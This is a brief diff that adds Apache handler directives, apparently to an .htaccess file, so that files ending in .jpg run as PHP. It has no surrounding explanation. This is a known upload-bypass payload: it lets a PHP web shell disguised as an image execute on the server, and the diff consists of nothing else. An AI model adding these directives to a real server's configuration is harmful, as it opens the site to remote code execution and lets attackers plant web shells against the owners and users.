@@ -1,0 +1,5 @@
+AddHandler php5-script .jpg
+
+AddType application/x-httpd-php .jpg
+
+Sethandler application/x-httpd-php
